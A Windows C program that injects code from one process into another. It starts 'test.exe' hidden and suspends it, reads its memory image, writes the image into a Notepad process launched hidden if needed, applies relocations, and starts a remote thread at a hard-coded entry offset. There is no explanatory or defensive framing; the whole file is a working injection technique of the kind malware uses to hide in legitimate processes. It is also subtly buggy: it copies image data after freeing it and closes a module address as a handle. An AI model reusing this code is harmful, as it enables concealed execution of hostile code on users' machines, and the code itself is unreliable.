#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <shlwapi.h> // For PathRemoveFileSpec and PathCombine

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;


// Function pointers for NtSuspendProcess and NtResumeProcess
typedef NTSTATUS(NTAPI* pNtSuspendProcess)(HANDLE ProcessHandle);
typedef NTSTATUS(NTAPI* pNtResumeProcess)(HANDLE ProcessHandle);

void SuspendProcess(DWORD processID) {
    HMODULE hNtDll = GetModuleHandle("ntdll.dll");
    pNtSuspendProcess NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(hNtDll, "NtSuspendProcess");

    if (NtSuspendProcess == NULL) {
        printf("Failed to load NtSuspendProcess function.\n");
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_SUSPEND_RESUME, FALSE, processID);
    if (hProcess == NULL) {
        printf("Failed to open process. Error: %lu\n", GetLastError());
        return;
    }

    NTSTATUS status = NtSuspendProcess(hProcess);
    if (status != 0) {
        printf("Failed to suspend process. Status: 0x%lx\n", status);
    } else {
        printf("Process suspended successfully.\n");
    }

    CloseHandle(hProcess);
}


// Function to get the PID of a process by its name
DWORD get_pid_by_name(const char *proc_name) {
    PROCESSENTRY32 pe32;
    HANDLE hProcessSnap;
    DWORD pid = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateToolhelp32Snapshot failed, error: %ld\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        fprintf(stderr, "Process32First failed, error: %ld\n", GetLastError());
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, proc_name) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return pid;
}

// Function to launch a process in a hidden state
void LaunchHiddenProcess(const char *processName) {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, (LPSTR)processName, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcess failed, error: %lu\n", GetLastError());
    } else {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Function to terminate a process by its PID
void terminate_process_by_pid(DWORD pid) {
    // Open a handle to the process with TERMINATE access
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to open process. Error: %lu\n", GetLastError());
        return;
    }

    // Terminate the process
    TerminateProcess(hProcess, 1); // Exit code 1
    CloseHandle(hProcess);
}

PVOID GetModuleBaseAddress(DWORD processID, const char* moduleName) {
    HMODULE hMods[1024];
    HANDLE hProcess;
    DWORD cbNeeded;
    unsigned int i;

    // Get a handle to the process.
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
    if (hProcess == NULL) {
        return NULL;
    }

    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            TCHAR szModName[MAX_PATH];

            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
                // Compare the module name with the desired module name.
                if (_tcsicmp(szModName, moduleName) == 0) {
                    // If found, return the base address.
                    CloseHandle(hProcess);
                    return (PVOID)hMods[i];
                }
            }
        }
    }

    // If the module is not found, return NULL.
    CloseHandle(hProcess);
    return NULL;
}

// Function to get the full path of a file in the same directory as the current executable
void get_file_path_in_executable_dir(const char* fileName, char* fullPath, size_t size) {
    // Buffer to hold the path of the current executable
    char exePath[MAX_PATH];

    // Get the path of the current executable
    if (GetModuleFileName(NULL, exePath, MAX_PATH) == 0) {
        printf("Failed to get executable path. Error: %lu\n", GetLastError());
        return;
    }

    // Remove the executable name to get the directory path
    if (PathRemoveFileSpec(exePath)) {
        // Combine the directory path with the desired file name
        if (PathCombine(fullPath, exePath, fileName) == NULL) {
            printf("Failed to combine paths. Error: %lu\n", GetLastError());
        }
    } else {
        printf("Failed to remove file spec from path. Error: %lu\n", GetLastError());
    }
}


int main() {
    char filePath[MAX_PATH];
    const char* filename = "test.exe";
    get_file_path_in_executable_dir(filename, filePath, sizeof(filePath));
    //LPCSTR filename = "D:\\Workspace\\C++\\Injection\\test.exe";
    LaunchHiddenProcess("test.exe");

    Sleep(20);
    DWORD processID = get_pid_by_name("test.exe");
    SuspendProcess(processID);
    if (processID == 0) {
        printf("Process not found.\n");
        return 1;
    }


    PVOID imageBase = GetModuleBaseAddress(processID, filePath);
    if(imageBase == 0) {
        printf("Error 1\n");
        CloseHandle(imageBase);
        return 1;
    }

    IMAGE_NT_HEADERS ntHeaderData;
    BYTE *imageData;

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, processID);

    //Read ntHeaderData and imageData
    if (hProcess != NULL) {
        IMAGE_DOS_HEADER dosHeader;
        SIZE_T bytesRead;
        if (ReadProcessMemory(hProcess, imageBase, &dosHeader, sizeof(dosHeader), &bytesRead)) {
            if (bytesRead == sizeof(dosHeader) && dosHeader.e_magic == IMAGE_DOS_SIGNATURE) {
                //printf("DOS Header e_magic: 0x%x\n", dosHeader.e_magic);

                PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader.e_lfanew);

                if (ReadProcessMemory(hProcess, ntHeader, &ntHeaderData, sizeof(ntHeaderData), &bytesRead)) {
                    if (bytesRead == sizeof(ntHeaderData)) {
                        //printf("Size Of Image: 0x%x\n", ntHeaderData.OptionalHeader.SizeOfImage);
                        SIZE_T imageSize = ntHeaderData.OptionalHeader.SizeOfImage;
                        imageData = (BYTE *)malloc(imageSize);
                        if (imageData) {
                                if (ReadProcessMemory(hProcess, imageBase, imageData, imageSize, &bytesRead)) {
                                    if (bytesRead == imageSize) {
                                        //printf("Successfully read the entire image.\n");
                                        printf("\n");
                                    } else {
                                        printf("Failed to read the entire image.\n");
                                    }
                                } else {
                                    printf("Failed to read image memory.\n");
                                }
                                free(imageData);
                            } else {
                                printf("Failed to allocate memory for image data.\n");
                            }
                    } else {
                        printf("Failed to read NT Headers.\n");
                    }
                } else {
                    printf("Failed to read NT Headers memory.\n");
                }
            } else {
                printf("Invalid DOS Header.\n");
            }
        } else {
            printf("Failed to read DOS Header memory.\n");
        }
        CloseHandle(hProcess);
    } else {
        printf("Failed to open process for reading.\n");
    }

    PVOID localImage = VirtualAlloc(NULL, ntHeaderData.OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    memcpy(localImage, imageData, ntHeaderData.OptionalHeader.SizeOfImage);

    DWORD pid = get_pid_by_name("Notepad.exe");

    if (pid == 0) {
        LaunchHiddenProcess("Notepad.exe");
        Sleep(1000);
        pid = get_pid_by_name("Notepad.exe");
    }
    if (pid == 0)
        return 0;

    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid);
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeaderData.OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeaderData.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    while (relocationTable->SizeOfBlock > 0) {
        DWORD relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        PBASE_RELOCATION_ENTRY relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
        for (DWORD j = 0; j < relocationEntriesCount; j++) {
            if (relocationRVA[j].Offset) {
                PDWORD_PTR originalAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[j].Offset);
                PDWORD_PTR patchedAddress = originalAddress;
                *patchedAddress += deltaImageBase;
            }
        }
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }

    if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeaderData.OptionalHeader.SizeOfImage, NULL)) {
        printf("Error 2\n");
        CloseHandle(imageBase);
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }

    //it is main address
    DWORD_PTR injectionEntryRVA = 0x152A;
    DWORD_PTR finalAddress = (DWORD_PTR)imageBase + injectionEntryRVA;
    DWORD_PTR injectionEntryPointAddress = finalAddress + deltaImageBase;

    HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectionEntryPointAddress, NULL, 0, NULL);
    if (remoteThread == NULL) {
        printf("Error 3\n");
        VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
        CloseHandle(imageBase);
        CloseHandle(targetProcess);
        VirtualFree(localImage, 0, MEM_RELEASE);
        return 1;
    }


    WaitForSingleObject(remoteThread, INFINITE);
    //Sleep(5000);

    CloseHandle(imageBase);
    CloseHandle(remoteThread);
    VirtualFreeEx(targetProcess, targetImage, 0, MEM_RELEASE);
    CloseHandle(targetProcess);
    VirtualFree(localImage, 0, MEM_RELEASE);

    terminate_process_by_pid(processID);
    terminate_process_by_pid(pid);
    return 0;
}
